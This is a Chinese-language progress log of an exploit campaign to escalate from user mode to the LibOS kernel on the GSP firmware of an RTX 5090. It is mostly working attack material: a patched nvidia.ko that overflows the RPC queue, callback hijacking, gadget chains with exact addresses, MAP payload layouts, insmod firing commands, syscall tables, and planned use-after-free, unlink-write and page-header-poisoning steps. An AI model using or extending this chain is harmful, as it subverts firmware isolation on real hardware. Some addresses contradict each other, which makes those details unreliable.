# ═══════════════════════════════════════════════════════════════
#
#  GSP LibOS 提权研究 — 权威进度文件
#  此文件为唯一权威参考,覆盖之前所有分散文档
#
#  最后更新: 2026-10-11 09:30
#  会话时间: 2026-10-10 21:00 ~ 2026-10-11 09:30 (约12小时)
#  环境: RTX 5090 (GB202) / VM实验室 / nvidia 610.57.04 / v21模块
#
# ═══════════════════════════════════════════════════════════════

---

## 目录
1. [目标与背景](#1-目标与背景)
2. [硬件与软件架构](#2-硬件与软件架构)
3. [漏洞入口: K3-1溢出](#3-漏洞入口-k3-1溢出)
4. [控制流劫持](#4-控制流劫持)
5. [v21管道(基础设施)](#5-v21管道)
6. [syscall执行能力](#6-syscall执行能力)
7. [轮询循环机制(核心攻击面)](#7-轮询循环机制)
8. [C2页头投毒(算术已解)](#8-c2页头投毒)
9. [根因发现: 3864字节溢出](#9-根因发现)
10. [MQI与内核全局读取](#10-mqi与内核全局读取)
11. [UAF与堆破坏证据](#11-uaf与堆破坏证据)
12. [metadata 232字节分析](#12-metadata-232字节分析)
13. [已关闭的路径](#13-已关闭的路径)
14. [当前瓶颈与下一步](#14-当前瓶颈与下一步)
15. [工具与地址速查表](#15-工具与地址速查表)
16. [实验纪律与事故记录](#16-实验纪律)

---

## 1. 目标与背景

**最终目标**: 在RTX 5090的GSP芯片上,让RM任务从U-mode(用户态)提升到LibOS内核的S-mode(内核态),获得对GPU的完全控制。

**背景**: 
- GSP是GPU内部的独立RISC-V处理器,运行NVIDIA自研的LibOS微内核
- RM(Resource Manager)是GSP上的用户态固件,处理来自驱动的一切请求
- GSP固件签名验证由FSP完成(本卡FSP runtime已永久死亡,不影响GSP)
- 原始目标(解锁L2缓存96MB→128MB)已被证明被硬件熔丝阻断,不是软件可达的

**攻击路径总览**:
```
K3-1溢出 → 元数据覆盖 → 回调劫持 → syscall执行 → C1双重释放/UAF → 
C2页头投毒 → RELEASE → jalr到任意地址 → S-mode → 窗口全开 → 完全控制
```

---

## 2. 硬件与软件架构

### 2.1 处理器层次
```
宿主机 Linux (root)
  └── nvidia.ko (v21修改版,参数化溢出)
        └── RPC通信协议
              └── GSP芯片 (RISC-V RV64GC)
                    ├── M-mode: BootROM (硅片ROM, 窗口编程)
                    ├── S-mode: LibOS 3.1 内核 (闭源,已逆向)
                    └── U-mode: RM任务 (资源管理器固件)
                          ├── RPC泵 (消息处理循环)
                          ├── msgq库 (队列管理)
                          └── 各种RM子系统
```

### 2.2 GSP内存布局(关键)
```
0x1000000-0x1E68xxx    RM固件代码(17MB, RX)
0x418ff68-0x41916xx   GSP全局数据(含MQI)
0x0FE4770E10           暂存区基址 P (确定性,跨启动不变)
  +0x00000 ~ +0x0FFFF  RX暂存区(64KB, 16个元素×4KB)
  +0x10000 ~ +0x1FFFF  TX暂存区(64KB, 16个元素×4KB)
  +0x20000 ~ +0x200E7  元数据(232字节, 控制结构)
  +0x200E8 ~ +0x20FFF  相邻堆对象(3864字节! 溢出会摧毁)
```

### 2.3 元数据(msgqMetadata)结构
```
偏移    大小   含义                    来源
+0x00   8B    pTheirTxHdr            init代码写入
+0x08   8B    0                       init
+0x10   8B    pTheirRxHdr            init
+0x18   8B    0                       init
+0x20   8B    TX暂存区指针(P+0x10000) init
+0x28   8B    hQueue/元数据自身(P+0x20000) init
+0x30   8B    期望seqNum(=1)          init
+0x38   8B    pWriteIncoming         init时=0,link后=sysmem指针
+0x40   8B    pReadOutgoing          init时=0,link后=sysmem指针
+0x48+  ...   各种队列常量和计数器
+0x78   8B    txLinked(=1)           link后
+0x84   4B    rx.msgSize(=4096)      常量
+0x88   4B    rx.msgCount(=64)       常量
+0x8c   4B    writePtr               动态计数器
+0x9c   4B    readPtr                动态计数器
+0xa0   4B    rxAvail                动态(有消息=1,无=0)
+0xa4   4B    rxLinked(=1)           link后
+0xb8   8B    ★fcnBackendRw(拷贝函数指针)★ ← 我们的劫持点!
+0xc0   8B    fcnBackendRwArg(queueinfo)   =0x04191620
+0xc8   8B    fcnInvalidate          link后设置
+0xd0   8B    fcnFlush(可置0跳过)
+0xe0   8B    fcnBarrier             =0x01004C5C
```

---

## 3. 漏洞入口: K3-1溢出

### 3.1 原理
主机驱动发送RPC时谎报消息长度:
- 实际内容: 1个元素(4KB)
- 声明长度: 33个元素(132KB)

GSP的RM相信声明长度,分配132KB暂存区接收。但暂存区只有128KB(32个元素)+232B元数据。第33个元素溢出到元数据和相邻堆。

### 3.2 溢出覆盖范围
```
元素 0-15  → RX暂存区(正常,消息在这里)
元素 16-31 → TX暂存区(无害,纯数据缓冲区,K=32已证存活)
元素 32    → 元数据+相邻堆(232B元数据+3864B堆对象=4096B全部覆盖)
```

### 3.3 MAP机制
v21补丁通过`xdig_map`参数允许精确控制元素32内每个4字节的值。未指定的偏移在SYSMEM中保持原值(通常是零)。

### 3.4 xdig_hex机制
通过`xdig_hex`参数一次性写入232字节的完整元数据内容(464个hex字符)。

---

## 4. 控制流劫持

### 4.1 +0xb8回调劫持
元数据+0xb8是`fcnBackendRw`(后端读/写函数指针)。RM泵每次收到消息时通过`jalr`调用此指针。覆盖它=执行任意RM固件地址。

**关键发现**: +0xb8不只是一个"钩子"——它是RM消息拷贝的核心原语。劫持它=RM无法正常收发消息。所以存活需要恢复完整的元数据。

### 4.2 可用的劫持目标
| 目标 | 地址 | 效果 |
|------|------|------|
| 原版copyhelper | 0x0100CF9C | 正常拷贝(但需要正确的元数据) |
| 读gadget | 0x0102 0A30 | 读任意内存+跳到读到的值(信息泄露) |
| 黄金gadget | 0x010C1D66 | 设置s10寄存器+二级跳转 |
| t0=8 wrapper | 0x01A9E45C | syscall t0=8 + fence + 干净返回 |
| t0=15 wrapper | 0x01A9E5D2 | syscall t0=15(SBI通道) + 返回 |
| t0=23 wrapper | 0x01A9E1D6 | syscall t0=23 + 返回(但sw a0会崩) |
| 轮询stub | 0x01A96F52 | 无限循环syscall(核心攻击面!) |
| t0=0 trap | 0x01C57653 | syscall t0=0(端口操作) |
| bare t0=2 | 0x01A96F56 | 仅syscall t0=2,无前置lwu |
| 安全ret | 0x0100DCBA | li a0,0 + ret(无害返回) |

### 4.3 A4链(五级gadget链)
```
泵 → read-gadget(0x1020A30)
  → 黄金gadget(0x10C1D66): s10=a1(受控指针)
  → T1(0x11E4566): s1←a1重定向到staging
  → T2(0x170B3E): a4=1(奇数,满足t0=0写入条件)
  → T3(0x1106D12): a3=[s1+0xD0](全控), a2=s3=P
  → T4(0x160C3C0): a1=0
  → V(t0=0 trap): syscall执行,可写[port+8/38/40]
```

---

## 5. v21管道(基础设施)

### 5.1 架构
- message_queue_cpu.c: RM侧全部射击逻辑,extern引用参数
- kernel-open/nvidia/nv.c: 参数定义+module_param_named
- 10个参数: xdig_k/ck/fn/pat/spy/skip/firen(int) + xdig_map/hex/sparse(charp)
- 默认惰性(xdig_k=0),参数通过insmod命令行传入

### 5.2 关键参数
```bash
# 射击: K=33个元素, checksum修正, 目标fn=76, 第51条RPC触发
insmod nvidia.ko xdig_k=33 xdig_ck=1 xdig_fn=76 xdig_firen=50 \
  xdig_map="0x100a4:1,0x100b8:0x1a96f52,..."

# 完整元数据写入(232字节HEX)
insmod nvidia.ko xdig_k=33 xdig_ck=1 xdig_hex="100e77e40f..." 

# spy模式(不点火,只打印RPC信息)
insmod nvidia.ko xdig_spy=5
```

### 5.3 firen(运行期触发)
`xdig_firen=N` 跳过前N条匹配的RPC,在第N+1条触发溢出。
- boot期间约发送30条fn=76 RPC
- firen=50 → 第51条fn=76 = 运行期RPC → boot已完成时触发

### 5.4 发射脚本
`k3_fire_v21.sh`: 自动VM复活+WPR2清场+insmod+观察(总耗时~7分钟)
`k3_meta_dump.sh`: 循环读取metadata字段(每发~4分钟)

---

## 6. syscall执行能力

### 6.1 已验证的syscall
| syscall | 功能 | 状态 |
|---------|------|------|
| t0=0 | 端口操作(PATH A写入/PATH A'关闭) | ✅写入已证(A4链,[port+38/40]=受控值) |
| t0=2 | 命令解释器(lookup(N)+RELEASE) | ✅N=0-26有效,N=100越界安全 |
| t0=8 | 内存拷贝(≤2MB) | ✅执行+返回(t0=8 wrapper) |
| t0=9 | 轮询type-6对象 | ✅在轮询循环中调用 |
| t0=15 | SBI通道操作 | ✅执行+返回(但handler阻塞) |
| t0=23 | 未知(快路径) | ✅执行(sw a0会崩如果a0无效) |

### 6.2 关键实验结果
- **A4链t0=0写入**: `[port+0x38]=a2, [port+0x40]=0xDEADBEEF` 确认写入内核
- **核心转储**: Xid 119时kflcnCoreDumpDestructive输出全寄存器(s0=0xDEADBEEF!)
- **t0=15 SBI**: syscall执行+返回确认(返回后ra断裂才崩)

---

## 7. 轮询循环机制(核心攻击面)

### 7.1 轮询stub工作原理
```
地址 0x1a96f52:
loop:
  lwu a0, 0(s10)      ← 从staging读取命令字N
  c.li t0, 2           ← syscall编号=t0=2
  c.unimp               ← 触发syscall!
  ... 检查结果 ...
  lwu a0, 0(s10)       ← 重新读取
  c.li t0, 9           ← 另一个syscall
  c.unimp               ← 触发!
  ... 检查 ...
  goto loop             ← 无限循环!
```

### 7.2 N值决定行为
| N值 | 行为 | 结果 | 意义 |
|-----|------|------|------|
| 0-26 | lookup有效→RELEASE对象→循环再RELEASE | UAF崩溃(0x18c09c8) | C1攻击 |
| 2 | teardown(释放所有对象) | 确定性堆破坏(0x81)+Xid 154 FLR | 大规模破坏 |
| 100+ | lookup越界→返回错误→无害循环 | Xid 119超时,任务存活 | ★存活原语★ |

### 7.3 存活模式详解(N=100)
- 轮询stub调用t0=2(100)→lookup失败→返回错误→无操作
- 然后调用t0=9→轮询type-6→无结果→返回
- 无限循环安全syscall→回调永不返回→永不触达post-callback崩溃
- **RM任务活着!** 内核持续处理trap,timer中断窗口持续开放

### 7.4 攻击模式详解(N=0-26)
- 每次循环RELEASE同一对象
- refcount: N→N-1→...→1→0(destroy!)→-1(UAF!)→-2→...
- destroy后对象进入freelist→下次循环读已释放内存
- 最终在unlink(0x18c09c8)踩到确定性垃圾(0xcef000ba2b900a6e)崩溃
- **C1-style UAF确认!** 堆布局跨启动确定性

### 7.5 瓶颈
N固定在staging中,无法在运行时修改。存活模式(N=OOB)无法做有用的事,攻击模式(N=有效)无法观察C1效果(系统崩溃)。

---

## 8. C2页头投毒(算术已解)

### 8.1 TYPECALC公式(与真内核逐值一致,含回绕)
```
desc = [(obj & ~0xFFF) + 0x20]        ← 页头+0x20(投毒点)
diff = (desc - 0xffffffffa300a000) mod 2^64
type = 低32位( 算术右移3(diff) × 0xCCCCCCCD )
```

### 8.2 RELEASE destroy路径
```
type_u32 = type(零扩展)
slot = (0xffffffffa300a000 + type_u32×40 + 8) mod 2^64
dtor = [slot]
if dtor != 0: jalr dtor  ← S-mode任意跳转!
```

### 8.3 攻击常数(已解,模拟器验证)
```
slot=0xFE4780E80 ← desc=0xFFFFFFFFE4780E78 (写到页头+0x20)
slot=0xFE4790E98 ← desc=0xFFFFFFFFE4790E90
可写区(staging+0x10000..0x200e8)共1644个可达slot
GDMA窗口区另有52429个(需内核侧窗口打开)
```

### 8.4 模拟器验证
emu_c2_staging.py Phase B2: 全链验证通过(jalr 0xcafec0de @ S-mode)

### 8.5 22个类型析构函数地图(boot自检器提取)
```
type 2: 0x93005bcc ← RELEASE([obj+0x30]) ★唯一的指针字段级联
type 3: 0x93005bf6
type 5: 0x930069b6
type 7: 0x93006a04
type 8: 0x93005e78
type 9: NULL(dtor=0)
type 11: 0x93005b1e
type 12: 0x93005958
type 14: 0x93005c3a
type 15: 0x93005bd2(子链表销毁)
type 16: 0x93005b16
```

---

## 9. 根因发现: 3864字节溢出摧毁相邻堆

### 9.1 问题
```
分配大小: 0x200E8 = RX(64K) + TX(64K) + metadata(232B)
元素32写入: 0x1000(4096B) 起始于偏移 0x20000
超出分配: 0x1000 - 0xE8 = 3864字节写入相邻堆!
```

### 9.2 影响
元素32的4096字节写入范围覆盖了:
- 232字节元数据(可以MAP修复)
- 3864字节相邻堆对象(被零化,不可修复)

崩溃点0x1a98380的s1寄存器指向的就是被摧毁的相邻堆结构。

### 9.3 实验证据
- 设置堆chunk header(0x100e8:0xF18, 0x100f0:0x1)→仍然崩溃
- 说明相邻堆不是简单的chunk header,是实际使用的内核数据结构

---

## 10. MQI与内核全局读取

### 10.1 MQI(Message Queue Info)全局
```
地址: 0x41914D0 (GSP全局数据区)
```

### 10.2 read-gadget读取结果(全部确定性)
```
MQI+0x1A8 = 0x0FE4790E10 (metadata指针,精确匹配P+0x20000!) ✅
MQI+0x1B8 = 0x0000000000000000 (unused)
MQI+0x18  = 0x0000000000000000 (unused)
MQI+0x10  = 0x0000000000000000 (unused)
queueinfo+0x00 = 0x1000 (page size常量)
queueinfo+0x78 = 0x1000 (同上)
```

### 10.3 意义
- read-gadget可以读取GSP内核全局数据(0x4191xxx区域)
- MQI布局与预期完全一致
- 核心转储(kflcnCoreDumpDestructive)提供全寄存器可见性

---

## 11. UAF与堆破坏证据

### 11.1 确定性UAF(N=0-26)
```
sepc=0x18c09c8, stval=0xcef000ba2b900a6e, scause=0x4
```
- 0x18c09c8是unlink代码(双链表摘除)
- stval=0xcef000ba2b900a6e是被释放对象的原始数据(非freelist元数据)
- 此值跨启动逐字节复现→堆布局完全确定性

### 11.2 unlink代码(0x18c09c8)
```
a5 = [node+0]      ← prev(读到垃圾)
a4 = [node+8]      ← next
[a5+8] = a4        ← prev->next = next ★内核写!
[a4]   = a5        ← next->prev = prev ★内核写!
```
如果能控制被释放对象的[node+0]和[node+8],unlink就是任意内核写!

### 11.3 确定性teardown破坏(N=2)
```
sepc=0x1a97054, stval=0x81, scause=0x4, Xid 154(PF FLR)
```
- 全新崩溃指纹,不同于NULL解引用
- stval=0x81是被污染的近NULL指针
- Xid 154=硬件级重置(内核堆实质破坏)

### 11.4 N=0 vs N=2 对比
| 命令 | sepc | stval | 含义 |
|------|------|-------|------|
| N=0(lookup+RELEASE) | 0x18c09c8 | 0xcef000ba... | unlink踩已释放内存 |
| N=2(teardown全部) | 0x1a97054 | 0x81 | 全新确定性破坏模式 |

---

## 12. metadata 232字节分析

### 12.1 HOST侧完整dump(一次获取)
v21的METADUMP在首次RPC时打印主机侧metadata全部232字节:
```
META[000]=ffffcfe58216a000  ← sysmem基址(HOST VA)
META[010]=ffffcfe58216a020  ← sysmem+0x20
META[020]=ffffcfe58216b000  ← sysmem+0x1000(entries)
META[030]=ffffcfe58216a020  ← sysmem+0x20
META[048]=ffffcfe58216a010  ← sysmem+0x10(writePtr位置)
META[050]=0004000000000000  ← tx.size=0x40000
META[058]=0000003f00001000  ← tx.msgCount=0x3f, entryOff=0x1000
META[078]=0000000000000001  ← txLinked=1
其余=0
```

### 12.2 HOST vs GSP侧差异
- 非指针字段(计数器/常量): 两端相同
- 指针字段: HOST VA ≠ GSP VA(同一物理内存的不同虚拟映射)
- 函数指针(+0xb8等): 固件代码地址(已知)
- **GSP VA的sysmem映射**: 仍未知(这是"原样抄"方案的关键缺口)

### 12.3 sysmem GSP VA候选测试
```
0x0FEB57C000 → 未映射(load page fault)
0x06F7C000   → 已映射,含0xafde0022d468fab4(非零数据!)
0x15129C000  → 已映射,全零
```

---

## 13. 已关闭的路径

| 路径 | 死因 | 关闭时间 |
|------|------|----------|
| Phase 0: U-mode直写内核数据 | RM独立页表,同VA落RM零页 | 早期 |
| t0=27 特权门 | 只能重映射调用者自己页表 | 早期 |
| W^X/代码注入 | staging=RW不可执行 | 早期 |
| t0=3 用户指针通道 | 8位句柄检查 | 早期 |
| IPC/port层溢出 | min截断(传输长度钳制到目的容量) | 早期 |
| t0=29/30 ghost SBI | RM固件中无触发序列(c.li/addi/ld/c.mv全部0命中) | 本session |
| C1盲抽风暴(自然RPC) | 12.6M+380K+490K全部零命中 | 之前session |
| N-scan ghost handler(N=28+) | N=28越界,句柄表count≤27 | 本session |
| dirty alive(全指针→staging) | 协议状态机混乱,非NULL崩 | 本session |
| chunk header修复(0x100e8) | 相邻堆不是简单chunk | 本session |
| 全恢复HEX(232B正确值) | 崩溃不在staging,在相邻堆(3864B) | 本session |

---

## 14. 当前瓶颈与下一步

### 14.1 瓶颈(按重要性)
1. **3864字节相邻堆破坏**: 元素32的4096B写入超出分配,摧毁相邻堆对象。无论metadata怎么修,这3864B总是被零化。
2. **GSP sysmem VA未知**: "原样抄"方案需要GSP侧的sysmem虚拟地址来计算metadata指针字段。
3. **轮询循环N不可变**: 存活模式(N=OOB)和攻击模式(N=有效)不能切换。

### 14.2 可行方向(按优先级)

**A. 轮询循环存活+观测(最快验证)**
```
N=100(越界) → RM存活 → 核心转储可见
→ 每发弹观察全寄存器 → 理解内核在做什么
→ 尝试不同的越界N值,看行为是否变化
```

**B. 利用UAF的unlink写原语(最接近提权)**
```
N=0 → 反复RELEASE → 对象释放 → 内存残留
→ 如果能在释放前往对象内存写我们的值...
→ unlink读[node+0]和[node+8]作为写目标
→ [a5+8]=a4和[a4]=a5是两个任意内核写!
→ t0=0写入[port+8]=受控值 → 端口被释放 → unlink用port+8的值
→ 但需要两个syscall(写入+释放),目前只能一个
```

**C. 相邻堆内容获取(解决根因)**
```
用N=100(存活模式)+核心转储读取堆布局
→ 或用read-gadget读取P+0x200E8区域(相邻堆)
→ 每发泄露8字节,3864B需要483发(太慢)
→ 更好: 用核心转储一次性获取相邻寄存器值
```

**D. 减少溢出范围(绕过根因)**
```
如果能让元素32只写232B而不是4096B...
→ 检查GSP拷贝循环是否可以在元数据末尾截断
→ 或者让SYSMEM元素32的后3864B包含正确值
```

### 14.3 下次开工的第一件事
发射N=100存活弹+核心转储,读取全寄存器:
- 确认任务确实活着
- 查看s1寄存器(崩溃时的NULL指针来源)
- 查看堆相关寄存器(可能包含相邻堆地址)

---

## 15. 工具与地址速查表

### 15.1 关键地址(GSP侧)
```
P (staging基址)     = 0x0FE4770E10 (跨启动确定)
metadata             = P + 0x20000
MQI全局              = 0x0041914D0
queueinfo            = 0x004191620
GSP寄存器窗口W       = 0x08200000
类型表基址           = 0xFFFFFFFFA300A000
syscall表A(0-15)     = 0xA3008280
syscall表B(16-27)    = 0xA3008308
RM固件代码           = 0x01000000-0x01E68xxx
```

### 15.2 RM固件gadget地址
```
copyhelper(原版)    = 0x0100CF9C
queueinfo            = 0x04191620
fence                = 0x01004C5C
读gadget             = 0x01020A30
黄金gadget           = 0x010C1D66
T1(s1重定向)         = 0x011E4566
T2(a4=1)            = 0x01702B3E
T3(a3受控)           = 0x01106D12
T4(a1=0)            = 0x0160C3C0
V(t0=0 trap)        = 0x01C57653
轮询stub(t0=2/9)    = 0x01A96F52
bare t0=2            = 0x01A96F56
t0=8 wrapper         = 0x01A9E45C
t0=15 wrapper        = 0x01A9E5D2
t0=23 wrapper        = 0x01A9E1D6
安全ret(li a0,0)    = 0x0100DCBA
```

### 15.3 内核函数地址(GB20X)
```
RELEASE              = 0xFFFFFFFF93005B26
TYPECALC             = 0xFFFFFFFF93004568
UNLINK               = 0xFFFFFFFF930005DC
窗口安装器(fault handler内) = 0xFFFFFFFF930044BE-0xFFFFFFFF9300450A
分配器               = 0xFFFFFFFF9300543A
```

### 15.4 内核syscall表(静态初始化)
```
t0=0:  0x930034A0   t0=1:  0x93003608   t0=2:  0x93003802
t0=3:  0x93003818   t0=4:  0x930008CC   t0=5:  0x930009C2
t0=6:  0x930004B0   t0=7:  0x93001B80   t0=8:  0x930005EE
t0=9:  0x930038FE   t0=10: 0x93000BDE   t0=11: 0x93000800
t0=12: 0x93000A20   t0=13: 0x930038B0   t0=14: 0x930038CC
t0=15: 0x930063CC   t0=16: 0x93001AE0   t0=17: 0x9300116A
t0=18: 0x930010CC   t0=19: 0x93000F9C   t0=20: 0x93006C20
t0=21: 0x93007160   t0=22: 0x93006300   t0=23: 0x93008D10
t0=24: 0x930060D2   t0=25: 0x9300612E   t0=26: 0x93006076
t0=27: 0x93004762
越界表(B后溢出):
t0=29: 0x930005D4(SBI直通!)  t0=30: 0x93008BD8
t0=31: 0x9300428C  t0=32: 0x9300425A  t0=33: 0x93004266
t0=34: 0x93000A8A
```

### 15.5 文件位置
```
v21补丁器:          /home/user/rpc_ovf_patch_v21.py
干净驱动源码:       /home/user/nvidia-live-recovery-lab/greenfield/open-gpu-kernel-modules/
内核反汇编:         /home/user/rt_5090_project/kernel_gb20x_disasm.txt
RM固件(rm_fw.elf): /tmp/rm_fw.elf (17MB)
真内核ELF:          /home/user/rt_5090_project/emu_bench/kernel_gb20x_REAL.elf
模拟器:            /home/user/rt_5090_project/rv64_emu.py
C2验证脚本:        /home/user/rt_5090_project/emu_bench/emu_c2_staging.py
发射脚本:          /home/user/rt_5090_project/k3_fire_v21.sh
VM实验室:          /home/user/rt_5090_project/vm_mods_lab/
```

---

## 16. 实验纪律

### 16.1 安全规则
- 绝不`rmmod -f`(D状态锁死只能重启)
- 实验后先SBR再回live模式
- VM楔死→宿主侧`systemctl restart k61-vm`
- 禁止写BIOS/熔丝/InfoROM

### 16.2 DKMS构建注意
- 必须`dkms build`然后`dkms install`两条
- 安装后验证:`modinfo -n nvidia`的mtime是新的
- C代码中不要在字符串里写`\\n`(跨Python层解释导致编译错)
- blacklist nvidia防止旧模块boot自爆

### 16.3 本session踩坑记录
| 坑 | 原因 | 解法 |
|---|---|---|
| 旧t0=1/2 stub是nop | 编码错误(t0=x5写成了a0=x10) | 重新搜索,已修正 |
| dk.sh nohup不执行 | SSH后台执行链路死亡 | 改用同步执行 |
| PA print不输出 | \\n转义问题 | 用空格替代换行 |
| SIGKILL自杀 | pgrep匹配到自身命令行 | 用[ ]避免自匹配 |
| 模块装不上"File exists" | 旧模块还在 | 先timeout rmmod |

---

## 附录A: 完整实验日志(时间线)

### 2026-10-10 21:00-23:00
- 修复DKMS(nohup后台链路死亡)
- v21 module_param版完成(参数insmod传入)
- 惰性加载验证(K=0,零Xid,GPU健康)
- 参数穿透验证(spy=5打印boot RPC序列72→73→1→65→228)

### 2026-10-10 23:00-01:00
- A4链t0=15首次执行+返回确认(Xid 120是返回后ra断裂)
- t0=15直挂(干净返回机制确认,syscall阻塞)
- TX-post槽劫持(+0xc8)
- 发现+0xb8是消息拷贝原语本体(劫持=断消息接收)

### 2026-10-11 01:00-03:00
- metadata 232字节HOST侧一次性dump成功
- K=17/32梯度存活验证(TX staging无害)
- K=33确认杀死(metadata覆盖)
- 运行期触发(firen=50)首次成功
- "dirty alive"(全指针→staging)失败(协议混乱)

### 2026-10-11 03:00-05:00
- metadata静态重建(init代码分析,函数指针解码)
- 全恢复HEX组装+发射(仍崩溃)
- 发现skip_unmapped保留的是SYSMEM陈旧字节非metadata原值

### 2026-10-11 05:00-07:00
- 运行期teardown(N=2):全新崩溃(0x81+Xid 154 FLR)
- UAF确认(N=0):unlink踩确定性垃圾(0xcef000ba...)
- 全部N=0-26同一指纹,跨启动逐字节复现
- 核心转储发现(s0=0xDEADBEEF=我们的a3值!)

### 2026-10-11 07:00-09:30
- MQI读取成功(+0x1a8=metadata指针精确匹配)
- queueinfo读取(只有常量0x1000)
- sysmem GSP VA候选测试(0x6F7C000有数据)
- 发现3864字节相邻堆溢出(根因)
- chunk header修复尝试(失败)
- N=26有效(N=100越界)确认

---

*本文档为唯一权威进度参考。所有之前分散在C2_ENTRY_AUDIT、GSP_PRIVESC_FINAL_PLAN等文件中的结论以此文件为准。*

---

## 附录B: 2026-10-11 突破日详细记录 (09:30-12:00)

### B.1 N-scan假象揭示 (最关键发现)

**之前的N-scan(0,3,5,16,26,100)全部是假象!**

真相:
- MAP key 0xFEE8(元素31, TX staging) **不在补丁可写范围内** — v21只写元素32
- 轮询stub读的[s10] = staging+0x1FEE8 = 从未被写入的陈旧值(0)
- 所有"N值"实验实际执行的都是N=0(或staging残留值)
- stval=0xcef000ba2b900a6e 在所有实验中一致(同一对象被释放)

**证据链**:
1. 直挂轮询stub到+0xb8: s10=0x43(泵原始值), 立即未对齐崩溃
2. s10不是我们的staging地址 — MAP里的a1设置(0x10038)确实控制a1(魔术数实验证明)
3. 但轮询stub的N从未被正确设置(在元素31, 补丁不写)

### B.2 a1受控确认 (魔术数实验)

```
MAP: 0x10038:0xE4790E10, 0x1003c:0xF (a1=metadata基址)
     0x10168:0xDEADBEEF (在[a1+0x168]位置放魔术数)
     0x100b8:0x1020A30 (read-gadget)
结果: sepc=0xDEADBEEE (jalr清低位: 0xDEADBEEF&~1)
```

**结论: metadata+0x38是a1的来源, MAP key 0x10038可以完全控制a1**

### B.3 黄金gadget完整解码

```asm
0x010C1D66: c.mv s10, a1      ← s10 = a1 (受控)
0x010C1D68: c.beqz a5, +0x68  ← ★a5==0时跳到0x10C1DD0★
0x010C1D6A: ld a5, 0x2c0(a1)  ← 正常路径: a5=[a1+0x2C0]
0x010C1D6E: c.jalr a5          ← 调用[a1+0x2C0]

a5==0路径 @ 0x10C1DD0:
0x010C1DD0: lbu a5, 0x57d(s10) ← 读[s10+0x57D]字节
0x010C1DD4: c.beqz a5, +0xa0   ← 字节==0则跳走
0x010C1DD6: ld a5, 0x2b8(s10) ← a5=[s10+0x2B8]
0x010C1DDA: ld a0, -0x78(s0)  ← a0=[s0-0x78](栈值)
0x010C1DDE: c.mv a1, s10       ← a1=s10
0x010C1DE0: c.jalr a5           ← 调用[s10+0x2B8]
```

**双路机制**: a5≠0走正常路径([a1+0x2C0]), a5==0走备用路径([s10+0x2B8])
两条路径都可以通过MAP完全控制目标地址!

### B.4 轮询stub完整解码(有退出条件!)

```asm
0x1A96F52: lwu a0, 0(s10)     ← N
0x1A96F56: c.li t0, 2
0x1A96F58: c.unimp             ← ★syscall t0=2(N)=lookup+RELEASE
0x1A96F5A: andi a5, a0, 0xff  ← 结果低8位
0x1A96F5E: c.li t0, 9
0x1A96F60: beq a5, s4, +0x4C  ← ★退出条件1: 结果&s4(=0)匹配→退出
0x1A96F64: lwu a0, 0(s10)     ← N
0x1A96F68: c.unimp             ← syscall t0=9(N)=poll
0x1A96F6A: c.mv a5, a0
0x1A96F6C: andi a5, a5, 0xff
0x1A96F70: ld a0, -0x80(s0)
0x1A96F74: c.mv a1, s10
0x1A96F76: c.bnez a5, +0x32   ← ★退出条件2: 结果≠0→退出
0x1A96F78: lw a5, 0x24(s3)    ← 更新计数器
...
0x1A96F88: auipc ra, 0xffe2a  ← 远跳转回循环开头

退出路径 @ 0x1A96FAC (beq exit):
  lwu a2, 0(s10)     ← N
  lwu a1, 0(s3)      ← 队列参数
  auipc a3, ...      ← 字符串地址(日志!)
  c.li a0, 3         ← 状态码=3
  auipc ra, 7; jalr  ← 调用日志函数(ra被覆盖!)
```

**重要**: 退出路径调用日志函数,原始ra(调用者返回地址)丢失!
t0=2返回0时(OOB N): 匹配s4=0 → 退出 → 日志 → ??? → 泵第二次调用(a1=MQI) → 崩溃

### B.5 存活原语确立 ★★★

```
+0xb8 = 0x01C9A7CC (c.j -2 自循环)
MAP = '0x100a4:1,0x100b8:0x01C9A7CC,0x100bc:0'

自循环体:
  0x01C9A7CA: c.ldsp tp, 0x1a8(sp)  ← 无害栈读取
  0x01C9A7CC: c.j -2                ← 跳回0x1C9A7CA

结果:
  ✓ 无Xid 120(无崩溃)
  ✓ 无Xid 154(无FLR)
  ✓ GSP_LOCKDOWN_NOTICE×8(其他GSP任务报告RM心跳丢失)
  ✓ "GSP RM heartbeat timed out"(心跳超时=任务卡住不死)
  ✓ 模块仍在加载
  ✗ SMI不通(RM忙于自循环,无法处理查询)
```

**意义**: 3864字节相邻堆破坏完全不影响存活!
只要回调不返回到泵的post-callback代码,堆破坏就无所谓。

其他自循环地址:
- 0x01C0EE7C: j 0 (4字节自跳转)
- 0x01C9A7CC: c.j -2 (2字节,推荐)
- 0x01C0EE4C等: beq x0,x0,0

### B.6 双路存活+syscall实验

```
MAP设计:
  正常路径(a5≠0): [a1+0x2C0]=轮询stub → 执行syscall!
  a5==0路径: [s10+0x57D]=1(非零), [s10+0x2B8]=自循环 → 存活!

结果: 无崩溃! LOCKDOWN通知! 
syscall是否执行待确认(无sepc/stval输出)
```

### B.7 关键MAP偏移对照表(修正版)

```
MAP key → staging+0x10000+key → 元素32内偏移 = key-0x10000

⚠️ 元素32偏移0x000-0x003 被校验和覆盖(xdig_ck=1)!
   N值等关键数据放在偏移0x100+!

推荐布局(a1=meta+0x100):
  0x10038/0x1003c: a1 = metadata_base+0x100 = 0x0FE4790F10
  0x10100: N值 (在[a1])
  0x103B8/0x103bc: a5==0路径目标 (在[s10+0x2B8])
  0x103C0/0x103c4: a5≠0路径目标 (在[a1+0x2C0])
  0x1067D: 非零字节 (在[s10+0x57D], a5==0路径的守卫)
  0x100b8/0x100bc: 回调地址 (+0xb8)
  0x100a4: rxLinked=1
```

### B.8 崩溃根因最终定论

所有K=33崩溃(0x18c09c8)的真正原因:

1. 回调(+0xb8)被泵调用(第一次, a1=受控值)
2. 轮询stub执行syscall(t0=2, N=陈旧值0)
3. t0=2返回0 → 匹配s4=0 → 轮询stub退出
4. 退出路径调用日志函数(ra丢失)
5. 日志函数返回后, 泵进行第二次回调调用(a1=MQI)
6. 黄金gadget(或轮询stub)以s10=MQI执行
7. 读[MQI+0x2C0]或[MQI+0x2B8](非受控值)
8. 跳到某个MQI相关函数 → t0=2(有效N) → RELEASE → unlink → 崩溃

**stval=0xcef000ba2b900a6e = 同一对象(由MQI路径确定)在所有实验中被释放**

### B.9 下次开工优先级

1. **确认双路实验中syscall是否执行** (换t0=8或t0=0看效果)
2. **利用双路机制做C1攻击**: 第一次调用=RELEASE攻击, 第二次调用=自循环存活
3. **探索黄金gadget a5==0路径的参数**: a0=[s0-0x78]和a1=s10, 可以做什么
4. **在自循环前嵌入有用syscall**: 搜索固件中syscall+跳转模式
